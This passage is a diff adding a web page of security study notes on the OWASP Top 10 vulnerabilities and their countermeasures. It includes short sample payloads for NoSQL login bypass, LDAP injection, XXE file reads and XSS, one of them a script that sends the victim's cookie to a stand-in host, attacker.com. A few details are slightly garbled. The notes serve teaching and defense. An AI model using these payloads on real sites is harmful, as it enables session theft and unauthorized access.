+<li>General term for attack types which consist of injecting code that is then interpreted/executed by the application</li>
+<li>Exploits poor handling of untrusted data.</li>
+<li>📝 According to <a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection.html">OWASP</a> it targets on server-side scripting engines, e.g. ASP or PHP</li>
+<li>However, according to <a href="https://en.wikipedia.org/wiki/Code_injection">Wikipedia code injection</a> also includes non server-side scripting engines such as <a href="#cross-site-scripting-xss">Cross Site Scripting</a> and <a href="../../14-sql-injection/sql-injection-overview/">SQL injection</a></li>
+<li>❗ Not same as <a href="#command-injection">Command injection</a></li>
+<li>Code injection leverages existing code to execute commands.<ul>
+<li>E.g. if PHP code injected, it's only limited by limited by what PHP is capable of.</li>
+</ul>
+</li>
+<li>Command injection runs system commands on underlying OS.</li>
+</ul>
+<h4 id="nosql-injection">NoSQL injection</h4>
+<ul>
+<li>Like SQL injection but targets NoSQL databases</li>
+<li>E.g. MongoDB login bypass</li>
+<li>
+<p>Assume back-end is vulnerable:</p>
+<p><code>json
+    // NodeJS with Express.js
+  db.collection('users').find({
+    "user": req.query.user,
+    "password": req.query.password
+  });</code></p>
+</li>
+<li>
+<p>Sending <code>https://cloudarchitecture.io/login?user=patrick&amp;password[%24ne]=</code>would cause:</p>
+<ul>
+<li><code>"password: { "&amp;ne": "" }</code> (not equal empty)</li>
+</ul>
+</li>
+</ul>
+<h4 id="ldap-injection">LDAP injection</h4>
+<ul>
+<li>LDAP is a protocol used to access and maintain directory services over IP</li>
+<li>Read more about <a href="#ldap-injection">LDAP</a></li>
+<li>E.g. using <strong><code>&amp;</code></strong> to end to query</li>
+<li>Application code: <code>String filter = "(&amp;(USER = " + user_name + ") (PASSWORD = " + user_password + "))";</code></li>
+<li>Attacker enters appends <code>)(&amp;)</code> after user name like: <code>johnDoe)(&amp;)</code></li>
+<li>Attacker gets access as <code>&amp;</code> ends the query and always evaluates to <code>true</code>.</li>
+</ul>
+<h4 id="soap-injection">SOAP injection</h4>
+<ul>
+<li>A type of XML injection as SOAP uses XML (eXtensible Markup Language) to represent the data.</li>
+<li>SOAP is a protocol used for web services to exchange structured information.</li>
+<li>📝 It communicates over usually on HTTP but in some legacy applications also SMTP.</li>
+<li>E.g. injecting an additional <code>&lt;FundsCleared&gt;True&lt;/FundsCleared&gt;</code>, in a bank application</li>
+</ul>
+<h4 id="command-injection">Command injection</h4>
+<ul>
+<li><strong>Shell injection</strong></li>
+<li>Applies to web applications that programmatically execute a command line</li>
+<li><strong>File injection</strong></li>
+<li>E.g. exploiting by causing an application to run/show a malicious remote file</li>
+<li><strong>HTML embedding</strong></li>
+<li>Refers to <a href="#cross-site-scripting-xss">Cross Site Scripting (XSS)</a></li>
+</ul>
+<h4 id="sql-injection">SQL injection</h4>
+<ul>
+<li>See <a href="../../14-sql-injection/sql-injection-overview/">SQL injection</a></li>
+</ul>
+<h3 id="countermeasures-for-injection">Countermeasures for injection</h3>
+<ul>
+<li>Input validation</li>
+<li>Customized error messages</li>
+<li>Monitoring database traffic</li>
+<li>Limit length of user input</li>
+</ul>
+<h2 id="broken-authentication">Broken authentication</h2>
+<ul>
+<li>Threats and vulnerabilities in authentication and session management</li>
+<li>Exploited to impersonate targets</li>
+<li>Vulnerabilities include</li>
+<li>Exposing session IDs in urls</li>
+<li>Session IDs not being rotated (changed)</li>
+<li>Weak or ineffective credential recovery and forgot-password processes</li>
+<li>Plain text, encrypted, or weakly hashed passwords</li>
+<li>Ineffective <a href="../../01-introduction/identity-access-management-%28iam%29/#multi-factor-authentication-mfa">multi-factor authentication (MFA)</a></li>
+<li>Improperly set timeouts (does not invalidate session during e.g. user inactivity or log out)</li>
+</ul>
+<h3 id="example-attacks-for-broken-authentication">Example attacks for broken authentication</h3>
+<ul>
+<li><strong>Credential stuffing</strong></li>
+<li>Automated injection of breached username/password pairs</li>
+<li>E.g. using <a href="https://github.com/danielmiessler/SecLists">list of known passwords</a></li>
+<li>An attacker can use old users browser while the user is still authenticated but not using his/her computer.</li>
+</ul>
+<h3 id="countermeasures-for-broken-authentication">Countermeasures for broken authentication</h3>
+<ul>
+<li>Use <a href="../../01-introduction/identity-access-management-%28iam%29/#multi-factor-authentication-mfa">MFA (multi-factor authentication)</a> where possible to prevent e.g. automated and brute-force attacks.</li>
+<li>Do not ship or deploy with any default credentials</li>
+<li>Implement weak-password checks, such as testing new or changed passwords against a list of the top 10000 worst passwords.</li>
+<li>Use NIST standard password length, complexity and rotation policies</li>
+<li>Harden pathways against account enumeration attacks by using the same messages for all outcomes.</li>
+<li>Limit or increasingly delay failed login attempts.</li>
+<li>Log failures and alert when attacks are detected.</li>
+<li>Use server-side, randomized session ID generation after login.</li>
+</ul>
+<h2 id="sensitive-data-exposure">Sensitive data exposure</h2>
+<ul>
+<li>Exploits weak encryption code.</li>
+</ul>
+<h3 id="example-attacks-for-sensitive-data-exposure">Example attacks for sensitive data exposure</h3>
+<ul>
+<li>SQL injection flaw to retrieve credit card numbers in clear text as they're not encrypted in transit.</li>
+<li>Downgrading from HTTPS to HTTP to intercept requests</li>
+<li>Pre-calculating hashes with simple (or) fast hash algorithms to find out passwords in clear text from a hashed database.</li>
+</ul>
+<h3 id="countermeasures-for-sensitive-data-exposure">Countermeasures for sensitive data exposure</h3>
+<ul>
+<li>Classify data (sensitive etc.) and apply controls as per the classification.</li>
+<li>Don't store sensitive data unnecessarily</li>
+<li>Encrypt data in transit and at rest</li>
+<li>Ensure up-to-date and strong standard algorithms, protocols, and keys are in place</li>
+<li>Use proper key management (rotate to not reuse same keys)</li>
+<li>Disable caching of sensitive data</li>
+</ul>
+<h2 id="xml-external-entities-xxe">XML External Entities (XXE)</h2>
+<ul>
+<li>Takes advantage of a poorly configured XML parser</li>
+<li>Allows attackers to cause DoS and access local or remote files</li>
+<li>Applications with improper XML validation or insecure XML processors are vulnerable.</li>
+</ul>
+<h3 id="example-attacks-for-xml-external-entities-xxe">Example attacks for XML External Entities (XXE)</h3>
+<ul>
+<li>Local files: Injecting <code>&lt;!ENTITY xxe SYSTEM "file:///dev/password" &gt;]&gt;</code> shows <code>dev/password</code> file</li>
+<li>Probing local network: <code>&lt;!ENTITY xxe SYSTEM "https://192.168.1.1/private" &gt;]&gt;</code></li>
+</ul>
+<h3 id="countermeasures-for-xml-external-entities-xxe">Countermeasures for XML External Entities (XXE)</h3>
+<ul>
+<li>Use less complex data formats such as JSON</li>
+<li>Patch or upgrade all XML processors (at least SOAP 1.2) and libraries and underlying operating system.</li>
+<li>Disable XML external entity and DTD processing in all XML parsers</li>
+<li>Implement proper server-side input validation</li>
+</ul>
+<h2 id="broken-access-control">Broken access control</h2>
+<ul>
+<li>Threats and vulnerabilities in access control.</li>
+<li>Exploited to evade the authentication and gain admin privileges.</li>
+</ul>
+<h3 id="attacks-for-broken-access-control">Attacks for broken access control</h3>
+<ul>
+<li>📝 Elevation of privilege by e.g. acting as an admin as user or when not logged in.</li>
+<li>Metadata manipulation such as tampering JSON Web Token (JWT) access control tokens</li>
+<li>CORS misconfigurations to do an unauthorized API access.</li>
+<li>Accessing API with missing access controls for POST, PUT and DELETE.</li>
+</ul>
+<h3 id="insecure-direct-object-references-idor">Insecure direct object references (IDOR)</h3>
+<ul>
+<li>📝 Direct access to internal objects through URL without authorization checks</li>
+<li>E.g. <code>cloudarchitecture.io/change_password.php?userId=victimUsername</code> to reset victims password</li>
+</ul>
+<h4 id="missing-function-level-access-control">Missing Function Level Access Control</h4>
+<ul>
+<li>Bypassing access control checks by modifying the URL</li>
+<li>E.g. reaching admin panel by modifying <code>cloudarchitecture.io/appInfo</code> to <code>cloudarchitecture.io/adminAppInfo</code>s</li>
+</ul>
+<h3 id="countermeasures-for-broken-access-control">Countermeasures for broken access control</h3>
+<ul>
+<li>Only use server-side code (or serverless API) for access control</li>
+<li>Re-use access controls throughout the application</li>
+<li>Minimize CORS usage.</li>
+<li>Access controls should enforce record ownership per for data being deleted/altered</li>
+<li>Rate limiting APIs and controllers to minimize harm from automated attacks</li>
+<li>Invalidate JWT tokens after server logout</li>
+<li>Unit and integration tests for functional access control</li>
+</ul>
+<h2 id="security-misconfiguration">Security misconfiguration</h2>
+<ul>
+<li>Exploits poorly configured application stack.</li>
+</ul>
+<h3 id="vulnerabilities-of-security-misconfiguration">Vulnerabilities of Security misconfiguration</h3>
+<ul>
+<li>Incomplete or ad hoc configurations</li>
+<li>Open cloud storage</li>
+<li>Misconfigured HTTP headers</li>
+<li>Verbose error messages containing sensitive information</li>
+<li>Default configurations</li>
+<li>Unnecessary services / unused services</li>
+<li>Unprotected files and directories</li>
+<li>Unpatched flaws</li>
+</ul>
+<h3 id="countermeasures-of-security-misconfiguration">Countermeasures of Security misconfiguration</h3>
+<ul>
+<li>Configure development, QA, and production environments identically with different credentials.</li>
+<li>Minimal platform without any unnecessary features, components, documentation, and samples.</li>
+<li>Review and update the configurations as part of patch management</li>
+<li>Especially review cloud storage permissions (e.g. S3 bucket permissions)</li>
+<li>Segmentation (separation between components) through containerization or cloud security groups (ACLs)</li>
+<li>Send security directives to clients, e.g. <a href="https://securityheaders.com/">security headers</a></li>
+<li>Automated process to verify the effectiveness of the configurations and settings in all environments</li>
+</ul>
+<h4 id="security-hardening">Security hardening</h4>
+<ul>
+<li>Securing a system by reducing its surface of vulnerability</li>
+<li>In principle a single-function system is more secure than a multipurpose one</li>
+<li>E.g. changing default passwords, the removal of unnecessary software, unnecessary usernames or logins, and the disabling or removal of unnecessary services.</li>
+<li>See <a href="https://privacy.sexy">privacy.sexy</a> for open-source security hardening on Windows.</li>
+</ul>
+<h3 id="attacks-of-security-misconfiguration">Attacks of Security misconfiguration</h3>
+<ul>
+<li>Attacker recognizes that sample application is left on application server</li>
+<li>Attacker logs in to the server through its admin console and default password.</li>
+<li>Attacker recognizes directory listing is not disabled on the server.  </li>
+<li>Attacker lists directories on a server</li>
+<li>Attacker downloads source code to decompile them to look for access control flaws.</li>
+<li>Attacker checks error messages to see component versions and looks for vulnerabilities in them.</li>
+</ul>
+<h2 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h2>
+<ul>
+<li>Also known as <strong>cross site scripting</strong></li>
+<li>📝 Taking untrusted data and sending it without input validation or escaping</li>
+<li>📝 Type of client-side <a href="#code-injection">code injection</a></li>
+<li>Used to</li>
+<li>hijack user sessions</li>
+<li>deface web sites</li>
+<li>redirect the user to malicious  sites</li>
+<li>bypass controls such as same-origin policy</li>
+</ul>
+<h3 id="types-of-cross-site-scripting-xss">Types of Cross-Site Scripting (XSS)</h3>
+<ul>
+<li><strong>Reflected XSS</strong></li>
+<li>Application or API includes unvalidated and unescaped user input as part of HTML output.</li>
+<li>Allows attacker to execute arbitrary HTML and JavaScript in victims browser.</li>
+<li>Enables attacker to show malicious link to user to point to an attacker-controlled page.</li>
+<li><strong>Stored XSS</strong></li>
+<li>Application or API stores unsanitized user input that is viewed at a later time.</li>
+<li><strong>DOM XSS</strong></li>
+<li>Vulnerability of JavaScript frameworks, SPAs and APIs that include attacker-controllable data to a page.</li>
+<li>Application shouldn't send attacker-controllable data to unsafe JavaScript APIs.</li>
+</ul>
+<h3 id="threats-of-cross-site-scripting-xss">Threats of Cross-Site Scripting (XSS)</h3>
+<ul>
+<li>Session stealing</li>
+<li>Account takeover</li>
+<li><a href="../../01-introduction/identity-access-management-%28iam%29/#multi-factor-authentication-mfa">MFA</a> bypass</li>
+<li>DOM node replacement or defacement (such as trojan login panels)</li>
+<li>Attacks against the user's browser such as malicious software download</li>
+<li>Key logging</li>
+</ul>
+<h3 id="example-attacks-for-cross-site-scripting-xss">Example attacks for Cross-Site Scripting (XSS)</h3>
+<ul>
+<li>Application sets value of an HTML parameter to an input without proper validation/sanitization</li>
+</ul>
+<p><code>html
+    page += "&lt;input name='credit-card' type='TEXT'
+    value='" + request.getParameter("CC") + "'&gt;";</code></p>
+<ul>
+<li>Attacker can then modify CC parameter in browser to: <code>'&gt;&lt;script&gt;document.location=
+'http://attacker.com/cgi-bin/cookie.cgi?
+foo='+document.cookie&lt;/script&gt;'.</code></li>
+<li>More examples are at <a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">XSS filter evasion cheatsheet</a></li>
+<li>❗ However must of them gets detected and filtered by Chrome or Firefox.</li>
+<li>💡 Can test if the injection will be successful on e.g. <a href="https://github.com/digininja/DVWA">Damn Vulnerable Web Application (DVWA)</a></li>
+</ul>
+<h3 id="countermeasures-for-cross-site-scripting-xss">Countermeasures for Cross-Site Scripting (XSS)</h3>
+<ul>
+<li>Enable Content Security Policy (CSP) as a defense-in-depth mitigating control against XSS.</li>
+<li>Only allows executing scripts from permitted domains.</li>
+<li>Filter input on arrival</li>
+<li>Set <code>HttpOnly</code> flag set for session cookies so they cannot be reached through JavaScript.</li>
+<li>📝 Escape HTML code</li>
+<li>Escape untrusted HTTP request data based on the context in the HTML output</li>
+<li>Use frameworks that automatically escape XSS by design</li>
+<li>Apply context-sensitive encoding<ul>
+<li>Encoding of HTML and JavaScript is different when modifying them based on user data</li>
+</ul>
+</li>
+</ul>
+<h2 id="insecure-deserialization">Insecure deserialization</h2>
+<ul>
+<li>Exploited by injecting malicious code into serialized data.</li>
+<li>Allows attacker to gain access through execution of malicious serialized data.</li>
+<li>Serialization can be used in e.g. caches, databases, HTTP cookies, authentication tokens..</li>
+</ul>
+<h3 id="attacks-for-insecure-deserialization">Attacks for insecure deserialization</h3>
+<ul>
+<li>Object and data structure related attacks</li>
+<li>Attacker modifies application logic or achieves remote code execution</li>
+<li>Data tampering attacks</li>
+<li>E.g. access-control-related attacks where data content is changed<ul>
+<li>E.g. changing <code>role: user</code> to <code>role: admin</code></li>
+</ul>
+</li>
+<li>Other serialization attack</li>
+</ul>
+<h3 id="countermeasures-for-insecure-deserialization">Countermeasures for insecure deserialization</h3>
+<ul>
+<li>Do not accept serialized objects from untrusted sources</li>
+<li>Use serialization medium only for primitive data types such as <code>JSON</code>.</li>
+<li>Alternatively</li>
+<li>Implementing integrity checks such as digital signatures against data tampering</li>
+<li>Enforce strict type constraints</li>
+<li>Isolate running deserialization logic in low privilege environments</li>
+<li>Log deserialization exceptions and failures e.g. type mismatches or exceptions.</li>
+<li>Restrict or monitor network traffic that deserializes.</li>
+<li>Alert if a user deserializes constantly</li>
+</ul>
+<h2 id="using-components-with-known-vulnerabilities">Using components with known vulnerabilities</h2>
+<ul>
+<li>Components include libraries, frameworks.</li>
+<li>Risk is big as they run with same privileges as the applications.</li>
+<li>Common in internet of things (IoT) as they are difficult (or impossible) to patch.</li>
+<li>Can be easily exploited by automated tools.</li>
+</ul>
+<h3 id="weaknesses-for-using-components-with-known-vulnerabilities">Weaknesses for using components with known vulnerabilities</h3>
+<ul>
+<li>Not knowing versions of used components and nested dependencies.</li>
+<li>If software is vulnerable, unsupported, or out of date.</li>
+<li>Fixing, upgrading platforms in a timely fashion for change control (e.g. once a month)</li>
+<li>Not testing compatibility of changed libraries</li>
+<li>Not securing component configurations. See: <a href="#security-misconfiguration">security misconfiguration</a></li>
+</ul>
+<h3 id="attack-examples-for-using-components-with-known-vulnerabilities">Attack examples for using components with known vulnerabilities</h3>
+<ul>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638">CVE-2017-5638</a>, remote code execution vulnerability that caused some breaches.</li>
+<li><a href="https://www.shodan.io/report/89bnfUyJ">Shodan IoT Search Engine</a> can show IoT devices that are still vulnerable to <a href="https://heartbleed.com/">Heartbleed</a></li>
+<li>See also <a href="../../02-footprinting/search-engines-and-online-resources/#shodan">Shodan | Footprinting</a></li>
+</ul>
+<h3 id="countermeasures-for-using-components-with-known-vulnerabilities">Countermeasures for using components with known vulnerabilities</h3>
+<ul>
+<li>Scan for vulnerabilities regularly</li>
+<li>Subscribe to security bulletins related to the components you use.</li>
+<li>Patch management process to remove unused dependencies, features, components, files, and documentation.</li>
+<li>Only obtain components from from official sources over secure links, prefer signed packages.</li>
+<li>Monitor for libraries and components that are unmaintained or do not create security patches</li>
+<li>Continuously inventory the versions of both client-side and server-side components and their versions.</li>
+</ul>
+<h2 id="insufficient-logging-and-monitoring">Insufficient logging and monitoring</h2>
+<ul>
+<li>🤗 <a href="https://www-01.ibm.com/common/ssi/cgi-bin/ssialias?htmlfid=SEL03130WWEN&amp;">Most breach studies</a> show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring</li>
+</ul>
+<h3 id="weaknesses-for-insufficient-logging-and-monitoring">Weaknesses for insufficient logging and monitoring</h3>
+<ul>
+<li>Storing logs only locally</li>
+<li>Unclear logs</li>
+<li>No monitoring of logs for suspicious activity</li>
+<li>Missing/ineffective incident response</li>
+<li>Not triggering alerts on e.g. security scans</li>
+</ul>
+<h3 id="countermeasures-for-insufficient-logging-and-monitoring">Countermeasures for insufficient logging and monitoring</h3>
+<ul>
+<li>Ensure logs have a format that can be consumed in a centralized log management solutions</li>
+<li>Establish or adopt an incident response and recovery plan</li>
+<li>Ensure all suspicious (login, RBAC, input failures) activities are logged with sufficient user context.</li>
+<li>Prevent tampering or deletion of log e.g. by using append-only database</li>
+<li>Ensure that suspicious activities are detected and responded to in a timely fashion.</li>
+</ul>
+
+              
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer">
+      
+        
+        <a href="../hacking-web-applications/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Hacking web applications" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Hacking web applications
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../denial-of-service/" class="md-footer__link md-footer__link--next" aria-label="Next: Denial of service" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Denial of service
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.bd0b6b67.min.js"}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.467223ff.min.js"></script>
+      
+    
+  </body>
+</html>
